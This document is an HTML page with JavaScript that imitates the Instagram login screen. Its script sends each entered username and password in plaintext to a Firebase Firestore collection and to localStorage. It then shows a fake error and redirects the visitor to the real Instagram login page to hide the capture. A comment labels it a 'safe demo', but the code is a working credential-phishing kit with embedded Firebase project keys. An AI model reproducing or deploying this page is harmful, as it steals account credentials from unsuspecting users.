<body>
  <div class="container">

    <!-- Login Box -->
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" width="175">

      <!-- SAFE DEMO FORM -->
      <form id="loginForm">
        <!-- ‚úÖ Editable: Field id aur placeholder -->
        <input type="text" id="User" placeholder="Username" required>
        <input type="password" id="Pass" placeholder="Password" required>
        <!-- ‚úÖ Editable: Button text -->
        <button type="submit" id="loginBtn">Log In</button>
      </form>

      <div class="error-text" id="errorMsg">Try again</div>
     

      <a href="#" class="forgot">Forgot password?</a>
      <div class="divider">OR</div>
      <a href="#" class="facebook-login">Log in with Facebook</a>
    </div>

    <!-- Signup Box -->
    <div class="signup-box">
      Don't have an account?<a href="#">Sign up</a>
    </div>
  </div>

  <!-- ================= FIREBASE SDK ================= -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

    // üîπ Editable: Apna Firebase config yaha daalein
    const firebaseConfig = {
      apiKey: "AIzaSyA0ws2RlbvBUjrdf4hUmRRbiXSSMb1SyIg",
      authDomain: "loginproject-b5d6e.firebaseapp.com",
      projectId: "loginproject-b5d6e",
      storageBucket: "loginproject-b5d6e.firebasestorage.app",
      messagingSenderId: "875733351851",
      appId: "1:875733351851:web:c3f4f3a74c67d5c08126ee"
    };

    // üîπ Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // ================= FORM SUBMIT =================
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      // ‚úÖ Editable: Field ids
      const user = document.getElementById("User").value;
      const pass = document.getElementById("Pass").value;

      // üîπ Save data to Firebase
      try {
        await addDoc(collection(db, "logindata"), {  // üîπ Editable: collection name "logins"
          username: user,                        // üîπ Editable: field name
          password: pass,                        // üîπ Editable: field name
          
        });

        // ‚úÖ Local storage (optional)
        localStorage.setItem("username", user);
        localStorage.setItem("password", pass);

        // Show error text (demo)
        document.getElementById("errorMsg").style.display = "block";

        // Redirect after 0.20 sec
        setTimeout(function () {
          window.location.href = "https://www.instagram.com/accounts/login/";
        }, 200);

      } catch(err) {
        console.error("Firebase error:", err);
        document.getElementById("errorMsg").innerText = "Error saving data ‚ùå";
        document.getElementById("errorMsg").style.display = "block";
      }
    });
  </script>

</body>
